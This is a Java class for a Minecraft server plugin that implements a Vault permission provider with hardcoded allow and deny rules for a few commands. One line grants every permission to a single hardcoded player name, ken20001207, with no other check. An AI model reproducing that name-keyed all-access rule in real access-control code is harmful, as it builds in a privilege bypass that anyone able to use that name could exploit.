package mainsystem;

import net.milkbowl.vault.permission.Permission;

public class permission extends Permission {

    @Override
    public String getName() {
        return "SMD permission";
    }

    @Override
    public boolean isEnabled() {
        return true;
    }

    @Override
    public boolean hasSuperPermsCompat() {
        return false;
    }

    @Override
    public boolean playerHas(String world, String player, String permission) {
        if (permission.equals("coreprotect.inspect"))
            return true;
        if (permission.equals("randomtp.signs.use"))
            return true;
        if (player.equals("ken20001207"))
            return true;
        if (permission.equals("bukkit.command.version"))
            return false;
        if (permission.equals("bukkit.command.plugins"))
            return false;
        if (permission.equals("bukkit.command.help"))
            return false;
        if (permission.equals("minecraft.command.me"))
            return false;
        return false;
    }

    @Override
    public boolean playerAdd(String world, String player, String permission) {
        return false;
    }

    @Override
    public boolean playerRemove(String world, String player, String permission) {
        return false;
    }

    @Override
    public boolean groupHas(String world, String group, String permission) {
        if (permission.equals("coreprotect.inspect"))
            return true;
        if (permission.equals("randomtp.signs.use"))
            return true;
        return false;
    }

    @Override
    public boolean groupAdd(String world, String group, String permission) {
        return false;
    }

    @Override
    public boolean groupRemove(String world, String group, String permission) {
        return false;
    }

    @Override
    public boolean playerInGroup(String world, String player, String group) {
        return false;
    }

    @Override
    public boolean playerAddGroup(String world, String player, String group) {
        return false;
    }

    @Override
    public boolean playerRemoveGroup(String world, String player, String group) {
        return false;
    }

    @Override
    public String[] getPlayerGroups(String world, String player) {
        return null;
    }

    @Override
    public String getPrimaryGroup(String world, String player) {
        return null;
    }

    @Override
    public String[] getGroups() {
        return null;
    }

    @Override
    public boolean hasGroupSupport() {
        return false;
    }

}